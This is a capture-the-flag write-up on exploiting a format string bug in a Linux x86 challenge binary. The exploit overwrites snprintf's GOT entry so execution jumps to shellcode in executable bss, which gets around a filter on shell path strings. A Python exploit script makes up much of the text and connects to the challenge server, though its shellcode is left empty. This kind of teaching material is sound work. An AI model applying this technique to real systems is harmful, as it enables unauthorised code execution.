## Overview

[challenge2][1] is an Linux x86 binary with a format string vulnerability. If our format string contains no common shells, it gets placed in bss so we can just jump directly to it.

<!--more-->

## Writeup

We quickly find the interesting function and notice the obvious format string vulnerability.  There are a couple of things we need to observe for this exploit:

  * The `snprintf` fills a buffer on the stack (there is actually a buffer overflow here we didn't use but could have), so we can use it to get arguments we want on the stack.
  * The program will exit if it detects `/bin/sh`, `/bin/bash`, etc. in our string, so we cannot use shellcode with those as constants. Luckily, [my favorite shellcode][3] doesn't have this problem.
  * Immediately after the `snprintf`, the function `countdown` makes another call to `snprintf`.
  * Our format string is initially placed in bss, which is at a known location and is executable.

But now we have everything we need for our exploit: we make a format string that overwrites the GOT address of `snprintf` to point to the area in bss with payload. The format string will have the form: `shellcode + padding + addr_of_snprintf_got_hi + addr_of_snprintf_got_lo + format_string`. Here is an exploit.

```
#!/usr/bin/python
import struct
import socket
import telnetlib
import sys
import string

shellcode = ""

got_addr = 0x804b044  # snprintf got.
target_val = 0x804b120  # Location of our payload in bss.
padding = "A"*(4 - (len(shellcode) % 4))
first_part =  shellcode + padding + struct.pack('I', got_addr) + struct.pack('I', got_addr + 2)

first_size = (target_val >> 16) - len(first_part)
second_size = (target_val &#038; 0xFFFF) - first_size - len(first_part)

first_addr = (len(first_part) / 4) + 3
second_addr = first_addr + 1

last_part = "%" + str(first_size) + "x%" + str(second_addr) + "$hn"
last_part += "%" + str(second_size) + "x%" + str(first_addr) + "$hn"

payload = first_part + last_part + "\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('128.238.66.213', 23456))
# s.connect(('127.0.0.1', 23456))
f = s.makefile('rw', bufsize=0)

f.write(payload)

t = telnetlib.Telnet()
t.sock = s
t.interact()
```
